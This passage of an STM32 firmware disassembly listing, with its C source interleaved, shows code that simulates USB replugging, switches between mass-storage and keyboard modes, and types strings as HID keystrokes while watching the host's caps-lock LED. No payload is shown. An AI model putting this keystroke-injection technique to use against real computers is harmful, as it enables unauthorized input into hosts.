  /** Configure LSE Drive Capability
  */
  HAL_PWR_EnableBkUpAccess();
 8000630:	f003 f862 	bl	80036f8 <HAL_PWR_EnableBkUpAccess>
  __HAL_RCC_LSEDRIVE_CONFIG(RCC_LSEDRIVE_LOW);
 8000634:	4b21      	ldr	r3, [pc, #132]	; (80006bc <SystemClock_Config+0xc0>)
 8000636:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800063a:	4a20      	ldr	r2, [pc, #128]	; (80006bc <SystemClock_Config+0xc0>)
 800063c:	f023 0318 	bic.w	r3, r3, #24
 8000640:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_LSE|RCC_OSCILLATORTYPE_MSI;
 8000644:	2314      	movs	r3, #20
 8000646:	617b      	str	r3, [r7, #20]
  RCC_OscInitStruct.LSEState = RCC_LSE_ON;
 8000648:	2301      	movs	r3, #1
 800064a:	61fb      	str	r3, [r7, #28]
  RCC_OscInitStruct.MSIState = RCC_MSI_ON;
 800064c:	2301      	movs	r3, #1
 800064e:	62fb      	str	r3, [r7, #44]	; 0x2c
  RCC_OscInitStruct.MSICalibrationValue = 0;
 8000650:	2300      	movs	r3, #0
 8000652:	633b      	str	r3, [r7, #48]	; 0x30
  RCC_OscInitStruct.MSIClockRange = RCC_MSIRANGE_6;
 8000654:	2360      	movs	r3, #96	; 0x60
 8000656:	637b      	str	r3, [r7, #52]	; 0x34
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
 8000658:	2302      	movs	r3, #2
 800065a:	63fb      	str	r3, [r7, #60]	; 0x3c
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_MSI;
 800065c:	2301      	movs	r3, #1
 800065e:	643b      	str	r3, [r7, #64]	; 0x40
  RCC_OscInitStruct.PLL.PLLM = 1;
 8000660:	2301      	movs	r3, #1
 8000662:	647b      	str	r3, [r7, #68]	; 0x44
  RCC_OscInitStruct.PLL.PLLN = 24;
 8000664:	2318      	movs	r3, #24
 8000666:	64bb      	str	r3, [r7, #72]	; 0x48
  RCC_OscInitStruct.PLL.PLLP = RCC_PLLP_DIV7;
 8000668:	2307      	movs	r3, #7
 800066a:	64fb      	str	r3, [r7, #76]	; 0x4c
  RCC_OscInitStruct.PLL.PLLQ = RCC_PLLQ_DIV2;
 800066c:	2302      	movs	r3, #2
 800066e:	653b      	str	r3, [r7, #80]	; 0x50
  RCC_OscInitStruct.PLL.PLLR = RCC_PLLR_DIV2;
 8000670:	2302      	movs	r3, #2
 8000672:	657b      	str	r3, [r7, #84]	; 0x54
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
 8000674:	f107 0314 	add.w	r3, r7, #20
 8000678:	4618      	mov	r0, r3
 800067a:	f003 f8c1 	bl	8003800 <HAL_RCC_OscConfig>
 800067e:	4603      	mov	r3, r0
 8000680:	2b00      	cmp	r3, #0
 8000682:	d001      	beq.n	8000688 <SystemClock_Config+0x8c>
  {
    Error_Handler();
 8000684:	f000 faa0 	bl	8000bc8 <Error_Handler>
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
 8000688:	230f      	movs	r3, #15
 800068a:	603b      	str	r3, [r7, #0]
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
 800068c:	2303      	movs	r3, #3
 800068e:	607b      	str	r3, [r7, #4]
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
 8000690:	2300      	movs	r3, #0
 8000692:	60bb      	str	r3, [r7, #8]
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
 8000694:	2300      	movs	r3, #0
 8000696:	60fb      	str	r3, [r7, #12]
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;
 8000698:	2300      	movs	r3, #0
 800069a:	613b      	str	r3, [r7, #16]

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
 800069c:	463b      	mov	r3, r7
 800069e:	2102      	movs	r1, #2
 80006a0:	4618      	mov	r0, r3
 80006a2:	f003 fcc1 	bl	8004028 <HAL_RCC_ClockConfig>
 80006a6:	4603      	mov	r3, r0
 80006a8:	2b00      	cmp	r3, #0
 80006aa:	d001      	beq.n	80006b0 <SystemClock_Config+0xb4>
  {
    Error_Handler();
 80006ac:	f000 fa8c 	bl	8000bc8 <Error_Handler>
  }

  /** Enable MSI Auto calibration
  */
  HAL_RCCEx_EnableMSIPLLMode();
 80006b0:	f004 f8d4 	bl	800485c <HAL_RCCEx_EnableMSIPLLMode>
}
 80006b4:	bf00      	nop
 80006b6:	3758      	adds	r7, #88	; 0x58
 80006b8:	46bd      	mov	sp, r7
 80006ba:	bd80      	pop	{r7, pc}
 80006bc:	40021000 	.word	0x40021000

080006c0 <SimulateUSB_unplug>:

/* USER CODE BEGIN 4 */
void SimulateUSB_unplug(){
 80006c0:	b580      	push	{r7, lr}
 80006c2:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_RESET);
 80006c4:	2200      	movs	r2, #0
 80006c6:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 80006ca:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80006ce:	f001 fa37 	bl	8001b40 <HAL_GPIO_WritePin>
}
 80006d2:	bf00      	nop
 80006d4:	bd80      	pop	{r7, pc}

080006d6 <SimulateUSB_plugin>:

void SimulateUSB_plugin(){
 80006d6:	b580      	push	{r7, lr}
 80006d8:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_SET);
 80006da:	2201      	movs	r2, #1
 80006dc:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 80006e0:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80006e4:	f001 fa2c 	bl	8001b40 <HAL_GPIO_WritePin>
}
 80006e8:	bf00      	nop
 80006ea:	bd80      	pop	{r7, pc}

080006ec <SwitchToHID>:

void SwitchToHID(){
 80006ec:	b580      	push	{r7, lr}
 80006ee:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 80006f0:	f7ff ffe6 	bl	80006c0 <SimulateUSB_unplug>
	isMSC = 0;
 80006f4:	4b08      	ldr	r3, [pc, #32]	; (8000718 <SwitchToHID+0x2c>)
 80006f6:	2200      	movs	r2, #0
 80006f8:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 80006fa:	2032      	movs	r0, #50	; 0x32
 80006fc:	f000 fd08 	bl	8001110 <HAL_Delay>
	SimulateUSB_plugin();
 8000700:	f7ff ffe9 	bl	80006d6 <SimulateUSB_plugin>
	MX_TIM2_Init();
 8000704:	f000 fb5a 	bl	8000dbc <MX_TIM2_Init>
	MX_USB_DEVICE_Init();
 8000708:	f00b fdd4 	bl	800c2b4 <MX_USB_DEVICE_Init>
	HAL_Delay(PlugSlot*10);
 800070c:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 8000710:	f000 fcfe 	bl	8001110 <HAL_Delay>
}
 8000714:	bf00      	nop
 8000716:	bd80      	pop	{r7, pc}
 8000718:	20000978 	.word	0x20000978

0800071c <SwitchToMSC>:

void SwitchToMSC(){
 800071c:	b580      	push	{r7, lr}
 800071e:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000720:	f7ff ffce 	bl	80006c0 <SimulateUSB_unplug>
	isMSC = 1;
 8000724:	4b07      	ldr	r3, [pc, #28]	; (8000744 <SwitchToMSC+0x28>)
 8000726:	2201      	movs	r2, #1
 8000728:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 800072a:	2032      	movs	r0, #50	; 0x32
 800072c:	f000 fcf0 	bl	8001110 <HAL_Delay>
	SimulateUSB_plugin();
 8000730:	f7ff ffd1 	bl	80006d6 <SimulateUSB_plugin>
	MX_USB_DEVICE_Init_MSC();
 8000734:	f00b fdee 	bl	800c314 <MX_USB_DEVICE_Init_MSC>
	HAL_Delay(PlugSlot*10);
 8000738:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 800073c:	f000 fce8 	bl	8001110 <HAL_Delay>
}
 8000740:	bf00      	nop
 8000742:	bd80      	pop	{r7, pc}
 8000744:	20000978 	.word	0x20000978

08000748 <Get_Single_Descriptor>:

void Get_Single_Descriptor(uint8_t ascii){
 8000748:	b580      	push	{r7, lr}
 800074a:	b0a4      	sub	sp, #144	; 0x90
 800074c:	af00      	add	r7, sp, #0
 800074e:	4603      	mov	r3, r0
 8000750:	71fb      	strb	r3, [r7, #7]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000752:	220f      	movs	r2, #15
 8000754:	2100      	movs	r1, #0
 8000756:	4821      	ldr	r0, [pc, #132]	; (80007dc <Get_Single_Descriptor+0x94>)
 8000758:	f00c fbe4 	bl	800cf24 <memset>
	uint8_t Map[MapLen] = Map_Init;
 800075c:	4a20      	ldr	r2, [pc, #128]	; (80007e0 <Get_Single_Descriptor+0x98>)
 800075e:	f107 0308 	add.w	r3, r7, #8
 8000762:	4611      	mov	r1, r2
 8000764:	2284      	movs	r2, #132	; 0x84
 8000766:	4618      	mov	r0, r3
 8000768:	f00c fc08 	bl	800cf7c <memcpy>
	Convert2CapsMap(Map);
 800076c:	f107 0308 	add.w	r3, r7, #8
 8000770:	4618      	mov	r0, r3
 8000772:	f000 f92f 	bl	80009d4 <Convert2CapsMap>
	uint8_t pos = Map[ascii];
 8000776:	79fb      	ldrb	r3, [r7, #7]
 8000778:	3390      	adds	r3, #144	; 0x90
 800077a:	443b      	add	r3, r7
 800077c:	f813 3c88 	ldrb.w	r3, [r3, #-136]
 8000780:	f887 308f 	strb.w	r3, [r7, #143]	; 0x8f
	sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 8000784:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000788:	091b      	lsrs	r3, r3, #4
 800078a:	b2db      	uxtb	r3, r3
 800078c:	461a      	mov	r2, r3
 800078e:	4b13      	ldr	r3, [pc, #76]	; (80007dc <Get_Single_Descriptor+0x94>)
 8000790:	5c9b      	ldrb	r3, [r3, r2]
 8000792:	b25a      	sxtb	r2, r3
 8000794:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000798:	f003 0307 	and.w	r3, r3, #7
 800079c:	2101      	movs	r1, #1
 800079e:	fa01 f303 	lsl.w	r3, r1, r3
 80007a2:	b25b      	sxtb	r3, r3
 80007a4:	4313      	orrs	r3, r2
 80007a6:	b259      	sxtb	r1, r3
 80007a8:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007ac:	091b      	lsrs	r3, r3, #4
 80007ae:	b2db      	uxtb	r3, r3
 80007b0:	461a      	mov	r2, r3
 80007b2:	b2c9      	uxtb	r1, r1
 80007b4:	4b09      	ldr	r3, [pc, #36]	; (80007dc <Get_Single_Descriptor+0x94>)
 80007b6:	5499      	strb	r1, [r3, r2]
	if((pos&0x08) == 8)
 80007b8:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007bc:	f003 0308 	and.w	r3, r3, #8
 80007c0:	2b00      	cmp	r3, #0
 80007c2:	d006      	beq.n	80007d2 <Get_Single_Descriptor+0x8a>
		sent_buffer[0] |= 0x02;
 80007c4:	4b05      	ldr	r3, [pc, #20]	; (80007dc <Get_Single_Descriptor+0x94>)
 80007c6:	781b      	ldrb	r3, [r3, #0]
 80007c8:	f043 0302 	orr.w	r3, r3, #2
 80007cc:	b2da      	uxtb	r2, r3
 80007ce:	4b03      	ldr	r3, [pc, #12]	; (80007dc <Get_Single_Descriptor+0x94>)
 80007d0:	701a      	strb	r2, [r3, #0]
}
 80007d2:	bf00      	nop
 80007d4:	3790      	adds	r7, #144	; 0x90
 80007d6:	46bd      	mov	sp, r7
 80007d8:	bd80      	pop	{r7, pc}
 80007da:	bf00      	nop
 80007dc:	2000025c 	.word	0x2000025c
 80007e0:	0800cfb0 	.word	0x0800cfb0

080007e4 <Get_Multi_Descriptor>:

void Get_Multi_Descriptor(uint8_t *array, int num){
 80007e4:	b580      	push	{r7, lr}
 80007e6:	b0a6      	sub	sp, #152	; 0x98
 80007e8:	af00      	add	r7, sp, #0
 80007ea:	6078      	str	r0, [r7, #4]
 80007ec:	6039      	str	r1, [r7, #0]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80007ee:	220f      	movs	r2, #15
 80007f0:	2100      	movs	r1, #0
 80007f2:	482a      	ldr	r0, [pc, #168]	; (800089c <Get_Multi_Descriptor+0xb8>)
 80007f4:	f00c fb96 	bl	800cf24 <memset>
	uint8_t Map[MapLen] = Map_Init;
 80007f8:	4a29      	ldr	r2, [pc, #164]	; (80008a0 <Get_Multi_Descriptor+0xbc>)
 80007fa:	f107 030c 	add.w	r3, r7, #12
 80007fe:	4611      	mov	r1, r2
 8000800:	2284      	movs	r2, #132	; 0x84
 8000802:	4618      	mov	r0, r3
 8000804:	f00c fbba 	bl	800cf7c <memcpy>
	Convert2CapsMap(Map);
 8000808:	f107 030c 	add.w	r3, r7, #12
 800080c:	4618      	mov	r0, r3
 800080e:	f000 f8e1 	bl	80009d4 <Convert2CapsMap>
	for(int i = 0; i < num; i++){
 8000812:	2300      	movs	r3, #0
 8000814:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 8000818:	e036      	b.n	8000888 <Get_Multi_Descriptor+0xa4>
		uint8_t pos = Map[array[i]];
 800081a:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 800081e:	687a      	ldr	r2, [r7, #4]
 8000820:	4413      	add	r3, r2
 8000822:	781b      	ldrb	r3, [r3, #0]
 8000824:	3398      	adds	r3, #152	; 0x98
 8000826:	443b      	add	r3, r7
 8000828:	f813 3c8c 	ldrb.w	r3, [r3, #-140]
 800082c:	f887 3093 	strb.w	r3, [r7, #147]	; 0x93
		sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 8000830:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000834:	091b      	lsrs	r3, r3, #4
 8000836:	b2db      	uxtb	r3, r3
 8000838:	461a      	mov	r2, r3
 800083a:	4b18      	ldr	r3, [pc, #96]	; (800089c <Get_Multi_Descriptor+0xb8>)
 800083c:	5c9b      	ldrb	r3, [r3, r2]
 800083e:	b25a      	sxtb	r2, r3
 8000840:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000844:	f003 0307 	and.w	r3, r3, #7
 8000848:	2101      	movs	r1, #1
 800084a:	fa01 f303 	lsl.w	r3, r1, r3
 800084e:	b25b      	sxtb	r3, r3
 8000850:	4313      	orrs	r3, r2
 8000852:	b259      	sxtb	r1, r3
 8000854:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000858:	091b      	lsrs	r3, r3, #4
 800085a:	b2db      	uxtb	r3, r3
 800085c:	461a      	mov	r2, r3
 800085e:	b2c9      	uxtb	r1, r1
 8000860:	4b0e      	ldr	r3, [pc, #56]	; (800089c <Get_Multi_Descriptor+0xb8>)
 8000862:	5499      	strb	r1, [r3, r2]
		if((pos&0x08) == 8)
 8000864:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000868:	f003 0308 	and.w	r3, r3, #8
 800086c:	2b00      	cmp	r3, #0
 800086e:	d006      	beq.n	800087e <Get_Multi_Descriptor+0x9a>
			sent_buffer[0] |= 0x02;
 8000870:	4b0a      	ldr	r3, [pc, #40]	; (800089c <Get_Multi_Descriptor+0xb8>)
 8000872:	781b      	ldrb	r3, [r3, #0]
 8000874:	f043 0302 	orr.w	r3, r3, #2
 8000878:	b2da      	uxtb	r2, r3
 800087a:	4b08      	ldr	r3, [pc, #32]	; (800089c <Get_Multi_Descriptor+0xb8>)
 800087c:	701a      	strb	r2, [r3, #0]
	for(int i = 0; i < num; i++){
 800087e:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 8000882:	3301      	adds	r3, #1
 8000884:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 8000888:	f8d7 2094 	ldr.w	r2, [r7, #148]	; 0x94
 800088c:	683b      	ldr	r3, [r7, #0]
 800088e:	429a      	cmp	r2, r3
 8000890:	dbc3      	blt.n	800081a <Get_Multi_Descriptor+0x36>
	}
}
 8000892:	bf00      	nop
 8000894:	bf00      	nop
 8000896:	3798      	adds	r7, #152	; 0x98
 8000898:	46bd      	mov	sp, r7
 800089a:	bd80      	pop	{r7, pc}
 800089c:	2000025c 	.word	0x2000025c
 80008a0:	0800cfb0 	.word	0x0800cfb0

080008a4 <SimulateKeyPress>:

void SimulateKeyPress(uint8_t ascii){
 80008a4:	b580      	push	{r7, lr}
 80008a6:	b082      	sub	sp, #8
 80008a8:	af00      	add	r7, sp, #0
 80008aa:	4603      	mov	r3, r0
 80008ac:	71fb      	strb	r3, [r7, #7]
	//get key:ascii Descriptor
	Get_Single_Descriptor(ascii);
 80008ae:	79fb      	ldrb	r3, [r7, #7]
 80008b0:	4618      	mov	r0, r3
 80008b2:	f7ff ff49 	bl	8000748 <Get_Single_Descriptor>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80008b6:	220f      	movs	r2, #15
 80008b8:	4903      	ldr	r1, [pc, #12]	; (80008c8 <SimulateKeyPress+0x24>)
 80008ba:	4804      	ldr	r0, [pc, #16]	; (80008cc <SimulateKeyPress+0x28>)
 80008bc:	f008 f838 	bl	8008930 <USBD_CUSTOM_HID_SendReport>
}
 80008c0:	bf00      	nop
 80008c2:	3708      	adds	r7, #8
 80008c4:	46bd      	mov	sp, r7
 80008c6:	bd80      	pop	{r7, pc}
 80008c8:	2000025c 	.word	0x2000025c
 80008cc:	200003c0 	.word	0x200003c0

080008d0 <SimulateKeyRelease>:

void SimulateKeyRelease(){
 80008d0:	b580      	push	{r7, lr}
 80008d2:	af00      	add	r7, sp, #0
	//set 0
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80008d4:	220f      	movs	r2, #15
 80008d6:	2100      	movs	r1, #0
 80008d8:	4804      	ldr	r0, [pc, #16]	; (80008ec <SimulateKeyRelease+0x1c>)
 80008da:	f00c fb23 	bl	800cf24 <memset>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80008de:	220f      	movs	r2, #15
 80008e0:	4902      	ldr	r1, [pc, #8]	; (80008ec <SimulateKeyRelease+0x1c>)
 80008e2:	4803      	ldr	r0, [pc, #12]	; (80008f0 <SimulateKeyRelease+0x20>)
 80008e4:	f008 f824 	bl	8008930 <USBD_CUSTOM_HID_SendReport>
}
 80008e8:	bf00      	nop
 80008ea:	bd80      	pop	{r7, pc}
 80008ec:	2000025c 	.word	0x2000025c
 80008f0:	200003c0 	.word	0x200003c0

080008f4 <SimulateKeyStroke>:

void SimulateKeyStroke(uint8_t ascii){
 80008f4:	b580      	push	{r7, lr}
 80008f6:	b082      	sub	sp, #8
 80008f8:	af00      	add	r7, sp, #0
 80008fa:	4603      	mov	r3, r0
 80008fc:	71fb      	strb	r3, [r7, #7]
	SimulateKeyPress(ascii);
 80008fe:	79fb      	ldrb	r3, [r7, #7]
 8000900:	4618      	mov	r0, r3
 8000902:	f7ff ffcf 	bl	80008a4 <SimulateKeyPress>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000906:	2023      	movs	r0, #35	; 0x23
 8000908:	f000 fc02 	bl	8001110 <HAL_Delay>
	SimulateKeyRelease();
 800090c:	f7ff ffe0 	bl	80008d0 <SimulateKeyRelease>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000910:	2023      	movs	r0, #35	; 0x23
 8000912:	f000 fbfd 	bl	8001110 <HAL_Delay>
}
 8000916:	bf00      	nop
 8000918:	3708      	adds	r7, #8
 800091a:	46bd      	mov	sp, r7
 800091c:	bd80      	pop	{r7, pc}
	...

08000920 <SimulateShortcutKey>:

void SimulateShortcutKey(uint8_t *array, int num){
 8000920:	b580      	push	{r7, lr}
 8000922:	b082      	sub	sp, #8
 8000924:	af00      	add	r7, sp, #0
 8000926:	6078      	str	r0, [r7, #4]
 8000928:	6039      	str	r1, [r7, #0]
	Get_Multi_Descriptor(array, num);
 800092a:	6839      	ldr	r1, [r7, #0]
 800092c:	6878      	ldr	r0, [r7, #4]
 800092e:	f7ff ff59 	bl	80007e4 <Get_Multi_Descriptor>
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000932:	220f      	movs	r2, #15
 8000934:	4907      	ldr	r1, [pc, #28]	; (8000954 <SimulateShortcutKey+0x34>)
 8000936:	4808      	ldr	r0, [pc, #32]	; (8000958 <SimulateShortcutKey+0x38>)
 8000938:	f007 fffa 	bl	8008930 <USBD_CUSTOM_HID_SendReport>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 800093c:	2023      	movs	r0, #35	; 0x23
 800093e:	f000 fbe7 	bl	8001110 <HAL_Delay>
	SimulateKeyRelease();
 8000942:	f7ff ffc5 	bl	80008d0 <SimulateKeyRelease>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000946:	2023      	movs	r0, #35	; 0x23
 8000948:	f000 fbe2 	bl	8001110 <HAL_Delay>
}
 800094c:	bf00      	nop
 800094e:	3708      	adds	r7, #8
 8000950:	46bd      	mov	sp, r7
 8000952:	bd80      	pop	{r7, pc}
 8000954:	2000025c 	.word	0x2000025c
 8000958:	200003c0 	.word	0x200003c0

0800095c <SimulateKeyStrokes>:

void SimulateKeyStrokes(char *str, int len, int *cntNow){
 800095c:	b580      	push	{r7, lr}
 800095e:	b084      	sub	sp, #16
 8000960:	af00      	add	r7, sp, #0
 8000962:	60f8      	str	r0, [r7, #12]
 8000964:	60b9      	str	r1, [r7, #8]
 8000966:	607a      	str	r2, [r7, #4]
	for(; *cntNow < len; (*cntNow)++){
 8000968:	e025      	b.n	80009b6 <SimulateKeyStrokes+0x5a>
    	//Ensure func SimulateKeyStroke is executed in uppercase environment.
		if((recv_buffer[0]&0x02) != 0x02){
 800096a:	4b18      	ldr	r3, [pc, #96]	; (80009cc <SimulateKeyStrokes+0x70>)
 800096c:	781b      	ldrb	r3, [r3, #0]
 800096e:	f003 0302 	and.w	r3, r3, #2
 8000972:	2b00      	cmp	r3, #0
 8000974:	d102      	bne.n	800097c <SimulateKeyStrokes+0x20>
			SimulateKeyStroke(128);
 8000976:	2080      	movs	r0, #128	; 0x80
 8000978:	f7ff ffbc 	bl	80008f4 <SimulateKeyStroke>
    	}
		SimulateKeyStroke(str[*cntNow]);
 800097c:	687b      	ldr	r3, [r7, #4]
 800097e:	681b      	ldr	r3, [r3, #0]
 8000980:	461a      	mov	r2, r3
 8000982:	68fb      	ldr	r3, [r7, #12]
 8000984:	4413      	add	r3, r2
 8000986:	781b      	ldrb	r3, [r3, #0]
 8000988:	4618      	mov	r0, r3
 800098a:	f7ff ffb3 	bl	80008f4 <SimulateKeyStroke>
		//Determine if RollBack is necessary
		if(NeedRollBack == 1){
 800098e:	4b10      	ldr	r3, [pc, #64]	; (80009d0 <SimulateKeyStrokes+0x74>)
 8000990:	681b      	ldr	r3, [r3, #0]
 8000992:	2b01      	cmp	r3, #1
 8000994:	d10a      	bne.n	80009ac <SimulateKeyStrokes+0x50>
			NeedRollBack = 0;
 8000996:	4b0e      	ldr	r3, [pc, #56]	; (80009d0 <SimulateKeyStrokes+0x74>)
 8000998:	2200      	movs	r2, #0
 800099a:	601a      	str	r2, [r3, #0]
			(*cntNow)--;
 800099c:	687b      	ldr	r3, [r7, #4]
 800099e:	681b      	ldr	r3, [r3, #0]
 80009a0:	1e5a      	subs	r2, r3, #1
 80009a2:	687b      	ldr	r3, [r7, #4]
 80009a4:	601a      	str	r2, [r3, #0]
			SimulateKeyStroke(129);
 80009a6:	2081      	movs	r0, #129	; 0x81
 80009a8:	f7ff ffa4 	bl	80008f4 <SimulateKeyStroke>
	for(; *cntNow < len; (*cntNow)++){
 80009ac:	687b      	ldr	r3, [r7, #4]
 80009ae:	681b      	ldr	r3, [r3, #0]
 80009b0:	1c5a      	adds	r2, r3, #1
 80009b2:	687b      	ldr	r3, [r7, #4]
 80009b4:	601a      	str	r2, [r3, #0]
 80009b6:	687b      	ldr	r3, [r7, #4]
 80009b8:	681b      	ldr	r3, [r3, #0]
 80009ba:	68ba      	ldr	r2, [r7, #8]
 80009bc:	429a      	cmp	r2, r3
 80009be:	dcd4      	bgt.n	800096a <SimulateKeyStrokes+0xe>
		}
	}
}
 80009c0:	bf00      	nop
 80009c2:	bf00      	nop
 80009c4:	3710      	adds	r7, #16
 80009c6:	46bd      	mov	sp, r7
 80009c8:	bd80      	pop	{r7, pc}
 80009ca:	bf00      	nop
 80009cc:	2000026c 	.word	0x2000026c
 80009d0:	2000027c 	.word	0x2000027c

080009d4 <Convert2CapsMap>:
		SimulateKeyStroke(128);
		PrintRecvBuf(recv_buffer);  //print Keyboard LED Status
	}
}

void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]){
 80009d4:	b480      	push	{r7}
 80009d6:	b085      	sub	sp, #20
 80009d8:	af00      	add	r7, sp, #0
 80009da:	6078      	str	r0, [r7, #4]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 80009dc:	2341      	movs	r3, #65	; 0x41
 80009de:	73fb      	strb	r3, [r7, #15]
 80009e0:	e01a      	b.n	8000a18 <Convert2CapsMap+0x44>
		LowerCaseMap[cnt] &= 0xf7;
 80009e2:	7bfb      	ldrb	r3, [r7, #15]
 80009e4:	687a      	ldr	r2, [r7, #4]
 80009e6:	4413      	add	r3, r2
 80009e8:	781a      	ldrb	r2, [r3, #0]
 80009ea:	7bfb      	ldrb	r3, [r7, #15]
 80009ec:	6879      	ldr	r1, [r7, #4]
 80009ee:	440b      	add	r3, r1
 80009f0:	f022 0208 	bic.w	r2, r2, #8
 80009f4:	b2d2      	uxtb	r2, r2
 80009f6:	701a      	strb	r2, [r3, #0]
		LowerCaseMap[cnt+'a'-'A'] |= 0x08;
 80009f8:	7bfb      	ldrb	r3, [r7, #15]
 80009fa:	3320      	adds	r3, #32
 80009fc:	687a      	ldr	r2, [r7, #4]
 80009fe:	4413      	add	r3, r2
 8000a00:	781a      	ldrb	r2, [r3, #0]
 8000a02:	7bfb      	ldrb	r3, [r7, #15]
 8000a04:	3320      	adds	r3, #32
 8000a06:	6879      	ldr	r1, [r7, #4]
 8000a08:	440b      	add	r3, r1
 8000a0a:	f042 0208 	orr.w	r2, r2, #8
 8000a0e:	b2d2      	uxtb	r2, r2
 8000a10:	701a      	strb	r2, [r3, #0]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a12:	7bfb      	ldrb	r3, [r7, #15]
 8000a14:	3301      	adds	r3, #1
 8000a16:	73fb      	strb	r3, [r7, #15]
 8000a18:	7bfb      	ldrb	r3, [r7, #15]
 8000a1a:	2b5a      	cmp	r3, #90	; 0x5a
 8000a1c:	d9e1      	bls.n	80009e2 <Convert2CapsMap+0xe>
	}
}
 8000a1e:	bf00      	nop
 8000a20:	bf00      	nop
 8000a22:	3714      	adds	r7, #20
 8000a24:	46bd      	mov	sp, r7
 8000a26:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000a2a:	4770      	bx	lr

08000a2c <InterruptTrap>:

void InterruptTrap(int *InterruptFlag){
 8000a2c:	b580      	push	{r7, lr}
 8000a2e:	b082      	sub	sp, #8
 8000a30:	af00      	add	r7, sp, #0
 8000a32:	6078      	str	r0, [r7, #4]
	if(*InterruptFlag == 1){
 8000a34:	687b      	ldr	r3, [r7, #4]
 8000a36:	681b      	ldr	r3, [r3, #0]
 8000a38:	2b01      	cmp	r3, #1
 8000a3a:	d10f      	bne.n	8000a5c <InterruptTrap+0x30>
		*InterruptFlag = 0;
 8000a3c:	687b      	ldr	r3, [r7, #4]
 8000a3e:	2200      	movs	r2, #0
 8000a40:	601a      	str	r2, [r3, #0]
		//Trigger timer interrupt immediately by setting the value of the register
		TIM2->EGR |= TIM_EGR_UG;
 8000a42:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000a46:	695b      	ldr	r3, [r3, #20]
 8000a48:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000a4c:	f043 0301 	orr.w	r3, r3, #1
 8000a50:	6153      	str	r3, [r2, #20]
		//Second entry interrupt
		MX_TIM2_Init();
 8000a52:	f000 f9b3 	bl	8000dbc <MX_TIM2_Init>
		HAL_TIM_Base_Start_IT(&htim2);
 8000a56:	4803      	ldr	r0, [pc, #12]	; (8000a64 <InterruptTrap+0x38>)
 8000a58:	f004 f8fc 	bl	8004c54 <HAL_TIM_Base_Start_IT>
	}
}
 8000a5c:	bf00      	nop
 8000a5e:	3708      	adds	r7, #8
 8000a60:	46bd      	mov	sp, r7
 8000a62:	bd80      	pop	{r7, pc}
 8000a64:	200002e4 	.word	0x200002e4

